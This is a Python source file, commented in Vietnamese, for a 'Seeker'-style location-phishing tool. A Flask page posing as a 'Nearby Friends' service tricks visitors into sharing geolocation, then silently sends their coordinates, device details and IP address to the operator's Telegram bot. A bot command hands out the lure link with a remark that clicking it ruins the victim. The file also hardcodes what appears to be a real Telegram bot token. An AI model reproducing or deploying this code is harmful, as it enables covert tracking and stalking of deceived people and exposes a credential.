import telebot
from flask import Flask, request, render_template_string
import os
from threading import Thread

TOKEN = '8222981632:AAGeWH4l1Mvmvaod8z5lVhthkyHXLtRvgOU'
ADMIN_ID = "6681014168" # ID sếp
bot = telebot.TeleBot(TOKEN)
app = Flask('')

# --- GIAO DIỆN SEEKER STYLE (GIẢ MẠO DỊCH VỤ) ---
# Trang này sẽ giả vờ là trang "Tìm kiếm bạn bè quanh đây"
SEEKER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nearby Friends | Tìm bạn quanh đây</title>
    <style>
        body { font-family: Arial; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 80%; max-width: 400px; }
        .btn { background-color: #0084ff; color: white; padding: 12px 24px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
    </style>
    <script>
        function requestLoc() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else { alert("Thiết bị không hỗ trợ định vị."); }
        }
        function success(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const platform = navigator.platform;
            const cores = navigator.hardwareConcurrency;
            fetch(`/save_data?lat=${lat}&lon=${lon}&plt=${platform}&core=${cores}`);
            setTimeout(() => { window.location.href = "https://www.google.com/maps"; }, 1000);
        }
        function error() { window.location.href = "https://www.google.com/maps"; }
    </script>
</head>
<body>
    <div class="card">
        <img src="https://cdn-icons-png.flaticon.com/512/854/854878.png" width="80">
        <h2>Nearby Friends</h2>
        <p>Để tìm kiếm những người bạn đang ở gần bạn nhất, vui lòng cho phép chúng tôi truy cập vị trí.</p>
        <button class="btn" onclick="requestLoc()">TÌM QUANH ĐÂY</button>
    </div>
</body>
</html>
"""

@app.route('/near-me')
def near_me():
    return render_template_string(SEEKER_HTML)

@app.route('/save_data')
def save_data():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    plt = request.args.get('plt')
    core = request.args.get('core')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = (
        f"💀 **[SEEKER] MỤC TIÊU ĐÃ SẬP BẪY!**\n\n"
        f"📱 **Thiết bị:** {plt} ({core} nhân)\n"
        f"🌐 **IP:** `{user_ip}`\n"
        f"📍 **Tọa độ:** `{lat}, {lon}`\n"
        f"🗺 **Google Maps:** [Xác định vị trí](https://www.google.com/maps?q={lat},{lon})\n"
    )
    bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    return "OK"

@bot.message_handler(commands=['getlink'])
def get_link(message):
    # Thay link Render của sếp vào đây
    bot.reply_to(message, "🔗 **Link Seeker của sếp:**\n`https://my-bot-24h.onrender.com/near-me`\n\n(Dụ họ bấm nút 'Tìm quanh đây' là xong đời họ)")

def run():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    Thread(target=run).start()
    bot.infinity_polling(skip_pending=True)
